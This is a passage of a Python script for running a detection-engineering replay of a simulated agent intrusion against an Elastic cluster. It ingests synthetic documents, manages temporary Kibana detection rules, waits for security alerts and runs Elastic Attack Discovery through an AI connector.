            print(f"created data stream: {name}")
        except ApiError as error:
            if error.status == 400 and isinstance(error.payload, dict):
                error_type = error.payload.get("error", {}).get("type")
                if error_type == "resource_already_exists_exception":
                    print(f"data stream exists: {name}")
                    continue
            raise


def bulk_ingest(es: HttpClient, docs: list[tuple[str, dict[str, Any]]]) -> None:
    lines: list[str] = []
    for index, doc in docs:
        lines.append(json.dumps({"create": {"_index": index}}))
        lines.append(json.dumps(doc))
    response = es.request("POST", "/_bulk?refresh=true", "\n".join(lines) + "\n", content_type="application/x-ndjson")
    if response.get("errors"):
        failures = [item for item in response.get("items", []) if item.get("create", {}).get("error")]
        raise RuntimeError(f"bulk ingest failed for {len(failures)} docs: {failures[:3]}")
    print(f"ingested synthetic documents: {len(docs)}")


def create_rules(kibana: KibanaClient, rules: list[dict[str, Any]]) -> list[dict[str, str]]:
    created: list[dict[str, str]] = []
    for rule in rules:
        payload = kibana.request("POST", "/api/detection_engine/rules", rule)
        created.append({"id": payload["id"], "rule_id": payload["rule_id"], "name": payload["name"]})
        print(f"created disabled rule: {payload['name']}")
    return created


def bulk_rule_action(kibana: KibanaClient, action: str, rule_ids: list[str]) -> None:
    if not rule_ids:
        return
    kibana.request("POST", "/api/detection_engine/rules/_bulk_action", {"action": action, "ids": rule_ids})
    print(f"{action}d rules: {len(rule_ids)}")


def alert_count(es: HttpClient, run_id: str, run_tag: str) -> tuple[int, list[dict[str, Any]]]:
    body = {
        "size": 0,
        "query": {
            "bool": {
                "filter": [
                    {"range": {"@timestamp": {"gte": "now-3h"}}},
                ],
                "should": [
                    {"term": {"labels.run_id": run_id}},
                    {"term": {"kibana.alert.rule.tags": run_tag}},
                ],
                "minimum_should_match": 1,
            }
        },
        "aggs": {"by_rule": {"terms": {"field": "kibana.alert.rule.name", "size": 20}}},
    }
    response = es.request("POST", "/.alerts-security.alerts-default/_search", body)
    total = response.get("hits", {}).get("total", {}).get("value", 0)
    buckets = response.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
    return total, buckets


def wait_for_alerts(es: HttpClient, run_id: str, run_tag: str, expected: int, timeout_seconds: int) -> tuple[int, list[dict[str, Any]]]:
    deadline = time.time() + timeout_seconds
    last_count = 0
    last_buckets: list[dict[str, Any]] = []
    while time.time() < deadline:
        count, buckets = alert_count(es, run_id, run_tag)
        last_count, last_buckets = count, buckets
        print(f"alerts generated: {count}/{expected}")
        if count >= expected:
            return count, buckets
        time.sleep(10)
    return last_count, last_buckets


def connector_type(connector: dict[str, Any]) -> str:
    return connector.get("connector_type_id") or connector.get("actionTypeId") or ""


def is_ai_connector(connector: dict[str, Any]) -> bool:
    ctype = connector_type(connector)
    name = connector.get("name", "").lower()
    return ctype in {".gen-ai", ".inference", ".bedrock", ".gemini"} or any(
        token in name for token in ("openai", "gpt", "claude", "anthropic", "gemini", "bedrock")
    )


def list_ai_connectors(kibana: KibanaClient) -> list[dict[str, Any]]:
    connectors = kibana.request("GET", "/api/actions/connectors")
    ai_connectors = [
        {
            "id": connector.get("id"),
            "name": connector.get("name"),
            "connector_type": connector_type(connector),
            "is_preconfigured": connector.get("is_preconfigured") or connector.get("isPreconfigured") or False,
        }
        for connector in connectors
        if is_ai_connector(connector)
    ]
    print(json.dumps({"ai_connectors": ai_connectors}, indent=2))
    return ai_connectors


def choose_connector(kibana: KibanaClient, args: argparse.Namespace) -> dict[str, str] | None:
    if args.skip_attack_discovery:
        return None

    if args.connector_id:
        if not args.connector_type:
            raise SystemExit("--connector-type is required when --connector-id is provided.")
        return {
            "connectorId": args.connector_id,
            "actionTypeId": args.connector_type,
            "connectorName": args.connector_name or args.connector_id,
        }

    if args.connector_name:
        connectors = kibana.request("GET", "/api/actions/connectors")
        for connector in connectors:
            if connector.get("name") == args.connector_name:
                return {
                    "connectorId": connector["id"],
                    "actionTypeId": connector_type(connector),
                    "connectorName": connector["name"],
                }
        raise SystemExit(f"Connector named {args.connector_name!r} was not found.")

    return None


def run_attack_discovery(kibana: KibanaClient, run_id: str, run_tag: str, connector: dict[str, str], timeout_seconds: int) -> dict[str, Any] | None:
    anon = kibana.request("GET", "/api/security_ai_assistant/anonymization_fields/_find?per_page=1000")
    fields = anon.get("data", []) if isinstance(anon, dict) else []
    body = {
        "alertsIndexPattern": ".alerts-security.alerts-default",
        "anonymizationFields": fields,
        "apiConfig": {
            "connectorId": connector["connectorId"],
            "actionTypeId": connector["actionTypeId"],
        },
        "connectorName": connector["connectorName"],
        "subAction": "invokeAI",
        "size": 150,
        "start": "now-3h",
        "end": "now",
        "replacements": {},
        "filter": {
            "bool": {
                "should": [
                    {"term": {"labels.run_id": run_id}},
                    {"term": {"kibana.alert.rule.tags": run_tag}},
                ],
                "minimum_should_match": 1,
            }
        },
    }
    generated = kibana.request("POST", "/api/attack_discovery/_generate", body, timeout=120)
    execution_uuid = generated.get("execution_uuid")
    print(f"attack discovery execution_uuid: {execution_uuid}")
    if not execution_uuid:
        return None

    deadline = time.time() + timeout_seconds
    last: dict[str, Any] | None = None
    while time.time() < deadline:
        response = kibana.request("GET", f"/api/attack_discovery/generations/{execution_uuid}?with_replacements=true")
        last = response
        generation = response.get("generation", {})
        status = generation.get("status")
        print(f"attack discovery status: {status}")
        if status in {"succeeded", "failed", "canceled", "dismissed"}:
            return response
        time.sleep(10)
    return last


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the Hugging Face agent intrusion replay using an Elastic cluster.")
    parser.add_argument("--es-url", default=os.getenv("ES_URL") or "http://localhost:9200", help="Elasticsearch URL. Default: %(default)s")
    parser.add_argument("--kibana-url", default=os.getenv("KIBANA_URL") or "http://localhost:5601", help="Kibana URL. Default: %(default)s")
    parser.add_argument("--space", default=os.getenv("KIBANA_SPACE") or "default", help="Kibana space. Default: %(default)s")
    parser.add_argument("--username", default=os.getenv("ELASTIC_USERNAME"), help="Elastic username. Prefer ELASTIC_USERNAME env var.")
    parser.add_argument("--password", default=os.getenv("ELASTIC_PASSWORD"), help="Elastic password. Prefer ELASTIC_PASSWORD env var.")
    parser.add_argument("--api-key", default=os.getenv("ELASTIC_API_KEY"), help="Elastic API key. Prefer ELASTIC_API_KEY env var.")
    parser.add_argument("--connector-id", help="Attack Discovery connector ID. Requires --connector-type.")
    parser.add_argument("--connector-type", help="Attack Discovery connector type, such as .inference or .gen-ai.")
    parser.add_argument("--connector-name", help="Attack Discovery connector display name to use or search for.")
    parser.add_argument("--list-connectors", action="store_true", help="List available AI/inference connectors and exit.")
    parser.add_argument("--skip-attack-discovery", action="store_true", help="Generate source data and alerts only.")
    parser.add_argument("--include-custom-rules", action="store_true", help="Also create temporary generated SIEM rules as optional gap-fill content. By default, the run focuses on OOTB Elastic content.")
    parser.add_argument("--keep-rules-enabled", action="store_true", help="Leave temporary emulation rules enabled after the run.")
    parser.add_argument("--delete-rules-after", action="store_true", help="Delete temporary emulation rules after the run instead of disabling them.")
    parser.add_argument("--min-ootb-alerts", type=int, default=1, help="Minimum OOTB alerts to wait for before Attack Discovery. Default: %(default)s")
    parser.add_argument("--alert-timeout", type=int, default=180, help="Seconds to wait for alerts. Default: %(default)s")
    parser.add_argument("--discovery-timeout", type=int, default=300, help="Seconds to wait for Attack Discovery. Default: %(default)s")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification.")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    auth = Auth.from_args(args)
    run_id = now_run_id()
    run_tag = f"{BASE_TAG}-run-{run_id}"

    es = HttpClient(args.es_url, auth, args.insecure)
    kibana = KibanaClient(args.kibana_url, auth, args.space, args.insecure)

    print(f"run_id: {run_id}")
    print(f"run_tag: {run_tag}")
    print(f"target_es: {args.es_url}")
    print(f"target_kibana: {args.kibana_url} space={args.space}")

    es.request("GET", "/")
    kibana.request("GET", "/api/status")

    if args.list_connectors:
        list_ai_connectors(kibana)
        return 0

    rules = build_rules(run_id, run_tag)
    docs = build_documents(run_id, run_tag)
    created_rules: list[dict[str, str]] = []
    discovery: dict[str, Any] | None = None

    try:
        ensure_data_streams(es)
        bulk_ingest(es, docs)
        if args.include_custom_rules:
            created_rules = create_rules(kibana, rules)
            rule_ids = [rule["id"] for rule in created_rules]
            bulk_rule_action(kibana, "enable", rule_ids)
            expected_alerts = len(docs)
            print("custom generated rules enabled for this run")
        else:
            expected_alerts = args.min_ootb_alerts
            print("custom generated rules are disabled by default; waiting for OOTB Elastic alerts")

        alerts, by_rule = wait_for_alerts(es, run_id, run_tag, expected=expected_alerts, timeout_seconds=args.alert_timeout)
        connector = choose_connector(kibana, args)
        if connector and alerts > 0:
            print(f"using attack discovery connector: {connector['connectorName']} ({connector['connectorId']}, {connector['actionTypeId']})")
            discovery = run_attack_discovery(kibana, run_id, run_tag, connector, timeout_seconds=args.discovery_timeout)
        elif alerts == 0:
            print("no matching alerts found; skipping Attack Discovery. Install/enable OOTB rules or rerun with --include-custom-rules.")
        elif not args.skip_attack_discovery:
            print("no AI connector selected; generated alerts only. Run --list-connectors, then rerun with --connector-name or --connector-id/--connector-type.")

        summary = {
            "run_id": run_id,
            "run_tag": run_tag,
            "campaign_id": CAMPAIGN_ID,
            "documents": len(docs),
            "rules": len(created_rules),
            "custom_rules_enabled": args.include_custom_rules,
            "alerts": alerts,
            "alerts_by_rule": by_rule,
            "attack_discovery": {
                "status": (discovery or {}).get("generation", {}).get("status"),
                "discoveries": (discovery or {}).get("generation", {}).get("discoveries"),
                "execution_uuid": (discovery or {}).get("generation", {}).get("execution_uuid"),
                "titles": [item.get("title") for item in (discovery or {}).get("data", [])],
            }
            if discovery
            else None,
        }
        print(json.dumps(summary, indent=2))
        return 0
    finally:
        if created_rules and not args.keep_rules_enabled:
            rule_ids = [rule["id"] for rule in created_rules]
            try:
                if args.delete_rules_after:
                    bulk_rule_action(kibana, "delete", rule_ids)
                else:
                    bulk_rule_action(kibana, "disable", rule_ids)
            except Exception as cleanup_error:
                print(f"warning: rule cleanup failed: {cleanup_error}", file=sys.stderr)


if __name__ == "__main__":
    raise SystemExit(main())
